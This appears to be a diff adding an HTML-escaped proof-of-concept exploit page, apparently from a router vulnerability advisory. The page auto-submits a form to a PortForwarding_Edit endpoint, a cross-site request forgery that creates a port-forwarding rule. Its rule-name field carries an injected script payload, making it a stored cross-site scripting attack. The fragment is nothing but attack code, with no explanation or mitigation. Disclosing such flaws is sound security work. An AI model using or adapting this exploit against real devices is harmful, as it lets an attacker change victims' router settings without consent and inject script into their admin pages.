@@ -1,0 +1,9 @@
+&lt;form id=&quot;form1&quot; method=&quot;post&quot;
+action=&quot;http://www.example.com/Forms/PortForwarding_Edit_1&quot;&gt; &lt;input
+name=&quot;PortRule_Name&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(7)&lt;/script&gt;&#039;&gt; &lt;input
+name=&quot;PortRule_SPort&quot; value=&quot;77&quot;&gt; &lt;input name=&quot;PortRule_EPort&quot;
+value=&quot;77&quot;&gt; &lt;input name=&quot;PortRule_SrvAddr&quot; value=&quot;10.0.0.1&quot; &gt;
+&lt;script&gt;
+var frm = document.getElementById(&quot;form1&quot;);
+frm.submit();
+&lt;/script&gt;
